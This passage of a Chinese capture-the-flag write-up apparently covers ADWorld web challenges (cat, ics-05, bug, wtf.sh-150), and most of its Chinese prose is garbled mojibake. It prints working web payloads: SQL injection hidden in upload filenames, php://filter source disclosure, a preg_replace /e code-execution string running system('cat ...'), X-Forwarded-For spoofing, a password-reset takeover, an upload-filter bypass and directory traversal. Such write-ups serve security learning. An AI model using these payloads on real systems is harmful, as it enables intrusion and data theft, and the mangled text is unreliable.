<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰æŸ¥è¡¨å</span><br><span class="line">lethe&#x27;,&#x27;1665&#x27;,&#x27;1665&#x27;),(( selselectect group_concat(table_name) frfromom information_schema.tables where table_schema = &#x27;web_upload&#x27;),&#x27;1665&#x27;,&#x27;1665&#x27;)#.jpg</span><br><span class="line"></span><br><span class="line">ï¼ˆ2ï¼‰æŸ¥åˆ—å</span><br><span class="line">lethe&#x27;,&#x27;1665&#x27;,&#x27;1665&#x27;),(( seselectlect group_concat(column_name) frfromom information_schema.columns where table_name= &#x27;hello_flag_is_here&#x27; ),&#x27;1665&#x27;,&#x27;1665&#x27;)#.jpg</span><br><span class="line"></span><br><span class="line">ï¼ˆ3ï¼‰æŸ¥flag</span><br><span class="line">lethe&#x27;,&#x27;1665&#x27;,&#x27;1665&#x27;),(( seselectlect i_am_flag frfromom hello_flag_is_here),&#x27;1665&#x27;,&#x27;1665&#x27;)#.jpg</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190518154938423.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="catï¼ˆXCTF-4th-WHCTF-2017ï¼‰"><a href="#catï¼ˆXCTF-4th-WHCTF-2017ï¼‰" class="headerlink" title="catï¼ˆXCTF 4th-WHCTF-2017ï¼‰"></a>catï¼ˆXCTF 4th-WHCTF-2017ï¼‰</h1><p>1ã€è¿›å…¥é¡µé¢ï¼Œæç¤ºè¦æ±‚æˆ‘ä»¬å¯ä»¥è¾“å…¥åŸŸåå¹¶è¿›è¡Œè¯·æ±‚ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190803012132442.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>2ã€æµ‹è¯•ä¸€ä¸‹å¯ä»¥å‘ç°ï¼š</p>
<ul>
<li>æ­£å¸¸ URLï¼Œè¿”å› ping ç»“æœ</li>
<li>éæ³• URLã€ç‰¹æ®Šç¬¦å·ï¼Œè¿”å› Invalid URL</li>
</ul>
<p>3ã€è¿™é‡ŒDjangoè°ƒè¯•æ¨¡å¼æ‰“å¼€äº†ï¼Œå‘ç°å¦‚æœåœ¨è¾“å…¥æ¡†ä¸­å€¼åŒ…å«urlç¼–ç ï¼Œåœ¨<code>?url=</code>ä¸­è¯·æ±‚å¤§äº<code>%7F</code>çš„å­—ç¬¦éƒ½ä¼šé€ æˆDjangoæŠ¥é”™ã€‚</p>
<p>4ã€åœ¨urlä¸­è¾“å…¥<code>?url=%80</code>,å¯ä»¥å¾—åˆ°æŠ¥é”™é¡µé¢:<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190803020706353.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>5ã€æŠ¥é”™ä¿¡æ¯éå¸¸å¤šï¼Œå¤§æ¦‚çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°ç¯å¢ƒä¿¡æ¯ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190803021000674.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯èƒ½è§‰å¾—å¥‡æ€ªï¼Œæ˜¯<code>.php</code>çš„é¡µé¢ï¼Œå´æŠ¥<code>python</code>çš„<code>django debug</code>é”™è¯¯ï¼Œæ‰€ä»¥ï¼Œåˆ¤æ–­æ˜¯ä¸€ä¸ªPHPè°ƒç”¨Pythonçš„ç«™ã€‚</p>
<p>æ¯”èµ›æ—¶ç»™äº†æç¤ºï¼š<code>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</code></p>
<p>æ‰€ä»¥åº”è¯¥æ˜¯PHPé€šè¿‡cURLå‘djangoçš„ç«™å‘é€æ•°æ®ï¼Œé‚£è¾¹å¤„ç†å®Œå†å°†æ•°æ®ä¼ å›ã€‚</p>
<p>é‚£å°±çœ‹ä¸€ä¸‹CURLmanul ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190803021722377.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å³ä½¿ç”¨<code>@</code>è¿›è¡Œæ–‡ä»¶ä¼ é€’ï¼Œå¦‚æœæ–‡ä»¶å†…å®¹ä¸­æœ‰ä¸Šè¿°è¶…å‡ºç¼–ç èŒƒå›´çš„å­—ç¬¦ï¼Œå°±ä¼šäº§ç”ŸæŠ¥é”™ä¿¡æ¯ï¼Œå®é™…ä¸ŠåŒ…å«ä¸­æ–‡å°±ä¼šæŠ¥é”™ã€‚</p>
<p>6ã€äºæ˜¯å°±ç»§ç»­åœ¨åˆšæ‰çš„æŠ¥é”™ä¿¡æ¯é‡Œæ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰æ¯”è¾ƒå…³é”®çš„ä¿¡æ¯æ–‡ä»¶ï¼Œå…ˆè€ƒè™‘æ•°æ®åº“ç›¸å…³çš„ï¼Œæœç´¢å…³é”®è¯<code>sql</code>ï¼Œå¯ä»¥çœ‹åˆ°ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190803022043530.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>7ã€äºæ˜¯è¯·æ±‚<code>?url=@/opt/api/database.sqlite3</code>,åˆå‘ç°æŠ¥é”™ä¿¡æ¯ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­æœç´¢å…³é”®è¯<code>ctf</code>å°±èƒ½çœ‹åˆ°flagã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190803022530665.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="ics-05ï¼ˆXCTF-4th-CyberEarthï¼‰"><a href="#ics-05ï¼ˆXCTF-4th-CyberEarthï¼‰" class="headerlink" title="ics-05ï¼ˆXCTF 4th-CyberEarthï¼‰"></a>ics-05ï¼ˆXCTF 4th-CyberEarthï¼‰</h1><p>1ã€è¿›å…¥é¡µé¢åå‘ç°å¤§éƒ¨åˆ†åŠŸèƒ½éƒ½æ˜¯è£…é¥°æ²¡ç”¨çš„ï¼Œåªæœ‰â€œè®¾å¤‡ç»´æŠ¤ä¸­å¿ƒâ€çš„é¡µé¢å¯ä»¥è¿›å»ï¼Œå‘ç°urlå˜æˆäº†<code>index.php?page=index</code>ï¼Œå¹¶ä¸”é¡µé¢ä¸Šä¼šæ˜¾ç¤ºindexã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811202050268.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>2ã€æ‰€ä»¥å…ˆè€ƒè™‘æ–‡ä»¶åŒ…å«ï¼Œå¾ˆå¸¸ç”¨çš„payloadäº†ï¼š<br><code>?page=php://filter/read=convert.base64-encode/resource=index.php</code>ï¼Œbase64è§£ç åå¾—åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">posix_setuid</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">--------------------------html code--------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alnum</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p <span class="class"><span class="keyword">class</span>=&quot;<span class="title">lead</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">page</span>; <span class="title">die</span>();?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;&lt;<span class="title">br</span> /&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;<span class="title">else</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">            &lt;p <span class="class"><span class="keyword">class</span>=&quot;<span class="title">lead</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">if</span> (<span class="title">strpos</span>($<span class="title">page</span>, &#x27;<span class="title">input</span>&#x27;) &gt; 0) </span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ã¦Â–Â¹Ã¤Â¾Â¿Ã§ÂšÂ„Ã¥Â®ÂÃ§ÂÂ°Ã¨Â¾Â“Ã¥</span></span><br><span class="line">Â¥Ã¨Â¾Â“Ã¥Â‡ÂºÃ§ÂšÂ„Ã¥ÂŠÂŸÃ¨ÂƒÂ½,Ã¦Â­Â£Ã¥ÂœÂ¨Ã¥Â¼Â€Ã¥ÂÂ‘Ã¤Â¸Â­Ã§ÂšÂ„Ã¥ÂŠÂŸÃ¨ÂƒÂ½Ã¯Â¼ÂŒÃ¥ÂÂªÃ¨ÂƒÂ½Ã¥Â†</span><br><span class="line">Ã©ÂƒÂ¨Ã¤ÂºÂºÃ¥Â‘Â˜Ã¦ÂµÂ‹Ã¨Â¯Â•</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>3ã€ç®€å•å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œé‡ç‚¹åœ¨æœ€åä¸€éƒ¨åˆ†ï¼š</p>
<ul>
<li><p>é¦–å…ˆè¦ä¼ªé€ X-Forwarded-Forä¸º127.0.0.1ã€‚</p>
</li>
<li><p>ç„¶åè¦ä»¥GETæ–¹æ³•ä¼ å…¥<code>pat</code>ã€<code>rep</code>ã€<code>sub</code>ä¸‰ä¸ªå‚æ•°ï¼Œè¿™ä¸‰ä¸ªå‚æ•°çš„å€¼åˆ†åˆ«ä½œä¸º<code>preg_replace()</code>å‡½æ•°çš„å‚æ•°<code>preg_replace($pattern, $replacement, $subject)</code>ï¼Œ<code>pattern</code>ä¸ºè¦æœç´¢çš„æ¨¡å¼ï¼Œ<code>replacement</code>ä¸ºç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ï¼Œ<code>subject</code>è¦è¿›è¡Œæœç´¢å’Œæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚</p>
</li>
<li><p><code>pattern</code>å‚æ•°å¯ä»¥ä½¿ç”¨ä¸€äº›PCREä¿®é¥°ç¬¦ï¼Œå…¶ä¸­ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811203651571.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å³<code>/e</code> ä¿®æ­£ç¬¦ä½¿ <code>preg_replace()</code>å°†<code>replacement</code>å‚æ•°å½“ä½œ PHP ä»£ç </p>
</li>
</ul>
<p>4ã€è¿™é‡Œæˆ‘ä»¬ä¸‰ä¸ªå‚æ•°éƒ½å¯æ§ï¼Œé‚£ä¹ˆæ„é€ payloadï¼š<code>?pat=/Lethe/e&amp;rep=system(&#39;cat s3chahahaDir/flag/flag.php&#39;)&amp;sub=Lethe</code>ï¼ŒåŒæ—¶ä¼ªé€ X-Forwarded-Forï¼Œå³å¯çœ‹åˆ°flagåœ¨æºç ä¸­ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811210014235.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="bugï¼ˆRCTF-2015ï¼‰"><a href="#bugï¼ˆRCTF-2015ï¼‰" class="headerlink" title="bugï¼ˆRCTF-2015ï¼‰"></a>bugï¼ˆRCTF-2015ï¼‰</h1><p>1ã€è¿›å…¥é¡µé¢åé¦–å…ˆæŒ‰å®ƒçš„è¦æ±‚æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œç™»é™†è¿›å»ä¹‹åï¼Œå‘ç°ManageåŠŸèƒ½åªæœ‰adminè´¦æˆ·æ‰èƒ½è®¿é—®ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811225311787.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>2ã€ä¸»ç•Œé¢é™¤äº†ç™»é™†å’Œæ³¨å†Œä»¥å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡æ³¨å†Œæ˜¯è¾“å…¥çš„Usernameã€Birthdayå’ŒAddressè¿›è¡Œå¯†ç æ‰¾å›ï¼Œåœ¨è‡ªå·±çš„è´¦æˆ·ä¸Šå‘ç°è¿˜æœ‰Personalé¡µé¢ä¼šæ˜¾ç¤ºæ³¨å†Œæ—¶çš„ä¿¡æ¯ï¼Œä¸”urlä¸­ä¼šæœ‰æ­¤è´¦å·çš„uidï¼Œå°è¯•å°†uidæ”¹ä¸º1ï¼Œå‘ç°å¹¶ä¸å¯ä»¥..<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811225626433.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>3ã€äºæ˜¯ä½¿ç”¨æ‰¾å›å¯†ç åŠŸèƒ½å¯¹è‡ªå·±çš„è´¦æˆ·è¿›è¡Œå¯†ç æ‰¾å›ï¼Œè¾“å…¥æ­£ç¡®çš„ä¿¡æ¯ï¼ˆä¸­é€”å‘ç°ä¸‰ä¸ªä¿¡æ¯åªè¦æ­£ç¡®ä¸¤ä¸ªï¼Œå°±å¯ä»¥ä¿®æ”¹å¯†ç äº†ï¼Œäºæ˜¯å°è¯•äº†å¯¹adminçš„Birthdayè¿›è¡Œçˆ†ç ´ï¼Œä½†ä¹Ÿæ— æœâ€¦ï¼‰ï¼Œæ­£ç¡®è¾“å…¥ä¿¡æ¯åè¿›å…¥å¦‚ä¸‹é¡µé¢ï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811230111884.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶åè¾“å…¥è¦ä¿®æ”¹çš„å¯†ç å¹¶æŠ“åŒ…ï¼Œå°è¯•æŠŠUsernameæ”¹ä¸ºadminï¼Œå‘ç°æˆåŠŸï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811230250893.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>4ã€ç™»é™†adminè´¦å·ï¼Œè®¿é—®manageråŠŸèƒ½æ˜¾ç¤º<code>IP Not allowedï¼</code>ï¼Œå°†XXFä¼ªé€ ä¸º127.0.0.1åå³å¯<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811230525691.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>5ã€å†æºç ä¸­çœ‹åˆ°æç¤ºï¼š<code>?module=filemanage&amp;do=???</code>ï¼Œæœ‰moduleæƒ³åˆ°doåº”è¯¥æ—¶<code>upload</code>ï¼Œè®¿é—®<code>/index.php?module=filemanage&amp;do=upload</code>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸Šä¼ é¡µé¢<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811230730921.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>6ã€è¿™é‡Œä¸ä»…å¯¹åç¼€è¿›è¡Œäº†é»‘åå•è¿‡æ»¤ï¼ŒåŒæ—¶ä¼šæ£€æŸ¥æ–‡ä»¶çš„å¼€å¤´å†…å®¹ï¼Œæ‰€ä»¥ä¸èƒ½ä»¥<code>&lt;?php</code>å¼€å¤´ï¼Œå¯ä»¥ç”¨<code>&lt;script language=&quot;php&quot;&gt;  ... php code... &lt;/script&gt;</code>æ¥è¿›è¡Œç»•è¿‡ï¼Œå…ˆä»¥<code>jpg</code>åç¼€ä¸Šä¼ ï¼ŒæŠ“åŒ…æ”¹åç¼€ä¸º<code>php5</code>æˆ–<code>php4</code>ï¼Œå³å¯çœ‹åˆ°flagã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190811231446640.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<br>

<h1 id="wtf-sh-150ï¼ˆcsaw-ctf-2016-qualsï¼‰"><a href="#wtf-sh-150ï¼ˆcsaw-ctf-2016-qualsï¼‰" class="headerlink" title="wtf.sh-150ï¼ˆcsaw-ctf-2016-qualsï¼‰"></a>wtf.sh-150ï¼ˆcsaw-ctf-2016-qualsï¼‰</h1><h6 id="Get-flag1"><a href="#Get-flag1" class="headerlink" title="Get flag1"></a>Get flag1</h6><p>1ã€è¿›å…¥é¡µé¢åï¼Œæ˜¯ä¸€ä¸ªç±»ä¼¼è®ºå›ç³»ç»Ÿï¼Œå…ˆæ³¨å†Œä¸ªè´¦å·ï¼ˆæ³¨å†Œçš„æ—¶å€™éšæ‰‹æµ‹è¯•ä¸€ä¸‹ï¼Œå­˜åœ¨adminè´¦æˆ·ï¼‰ï¼Œè¿˜å‘ç°ç½‘é¡µçš„åç¼€æ˜¯<code>.wtf</code>ã€‚</p>
<p>2ã€æ ¹æ®ä»¥å¾€çš„æ€è·¯ï¼Œè®ºå›ç³»ç»Ÿ+å­˜åœ¨adminï¼Œåº”è¯¥å°±æ˜¯æƒ³åŠæ³•ä»¥adminç™»é™†äº†å‘—ï¼Œå°è¯•ä¸€ç•ªæœªæœï¼Œè¯•äº†å‡ ä¸ªåŠŸèƒ½ï¼Œæ³¨æ„åˆ°urlçš„å½¢å¼æœ‰<code>/profile.wtf?user=..</code>å’Œ<code>/post.wtf?post=K8laH</code>æœ‰ç‚¹åƒæ–‡ä»¶åŒ…å«ï¼Œæµ‹è¯•å‘ç°å­˜åœ¨ç›®å½•è·³è½¬ï¼Œå¯ä»¥ä»»æ„è¯»å–æ–‡ä»¶ã€‚<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814004433668.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>4ã€<code>/post.wtf?post=../../</code>å‘ç°æ‰€æœ‰çš„æºç ä¼šè¢«æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œæœç´¢å…³é”®è¯flagï¼š<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ADWorld-Writeup/20190814005407861.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æºç å¦‚ä¸‹ï¼Œæ˜¯ä¸€æ®µbashè„šæœ¬ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;/css/std.css&quot;</span> &gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">$ <span class="keyword">if</span> contains <span class="string">&#x27;user&#x27;</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">&quot;users/<span class="variable">$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;</span>&quot;</span></span><br><span class="line">$ <span class="keyword">then</span></span><br><span class="line">$   <span class="built_in">local</span> username=$(<span class="built_in">head</span> -n 1 <span class="built_in">users</span>/<span class="variable">$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;</span>);</span><br><span class="line">$   <span class="built_in">echo</span> <span class="string">&quot;&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>&#x27;s posts:&lt;/h3&gt;&quot;</span>;</span><br><span class="line">$   <span class="built_in">echo</span> <span class="string">&quot;&lt;ol&gt;&quot;</span>;</span><br><span class="line">$   get_users_posts <span class="string">&quot;<span class="variable">$&#123;username&#125;</span>&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span></span><br><span class="line">$       post_slug=$(awk -F/ <span class="string">&#x27;&#123;print $2 &quot;#&quot; $3&#125;&#x27;</span> &lt;&lt;&lt; <span class="string">&quot;<span class="variable">$&#123;post&#125;</span>&quot;</span>);</span><br><span class="line">$       <span class="built_in">echo</span> <span class="string">&quot;&lt;li&gt;&lt;a href=\&quot;/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\&quot;&gt;<span class="subst">$(nth_line 2 <span class="string">&quot;<span class="variable">$&#123;post&#125;</span>&quot;</span> | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;</span><br><span class="line">$   <span class="keyword">done</span> </span><br><span class="line">$   <span class="built_in">echo</span> <span class="string">&quot;&lt;/ol&gt;&quot;</span>;</span><br><span class="line">$   <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">&quot;<span class="variable">$&#123;COOKIES[&#x27;USERNAME&#x27;]&#125;</span>&quot;</span> = <span class="string">&#x27;admin&#x27;</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">&#x27;admin&#x27;</span> ]]</span><br><span class="line">$   <span class="keyword">then</span></span><br><span class="line">$       get_flag1</span><br><span class="line">$   <span class="keyword">fi</span></span><br><span class="line">$ <span class="keyword">fi</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>ç¨å¾®çœ‹ä¸€ä¸‹ï¼Œå‘ç°æœç„¶æ˜¯ä»¥adminèº«ä»½ç™»é™†ï¼Œå°±èƒ½æ‹¿åˆ°flag1äº†ã€‚</p>
